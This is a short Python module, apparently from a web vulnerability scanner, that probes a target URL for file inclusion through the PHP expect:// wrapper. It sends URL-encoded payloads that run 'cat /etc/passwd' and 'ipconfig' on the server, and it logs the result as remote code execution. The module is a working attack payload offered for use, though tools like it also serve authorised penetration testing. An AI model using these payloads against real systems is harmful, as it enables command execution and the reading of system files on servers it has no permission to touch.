"""Expect"""
from src.utils.arguments import init_args
from src.configs.config import proxies
from src.httpreqs.request import prepareRequest
from src.httpreqs.request import REQUEST
from src.utils.colors import Colors


def test_expect(url, post):
    """Test Expect"""
    args  = init_args()
    if args['verbose']:
        print(Colors().blue("[i]") + " Testing with expect wrapper...", flush = True)

    tests = []
    tests.append("expect%3A%2F%2Fcat%20%2Fetc%2Fpasswd")
    tests.append("expect%3A%2F%2Fipconfig")

    for i, test in enumerate(tests):
        u, reqHeaders, postTest = prepareRequest(args['param'], test, url, post)
        _, br = REQUEST(u, reqHeaders, postTest, proxies, "RCE", "EXPECT")

        if not br:
            return

        if i == 1 and args['quick']:
            return

    return
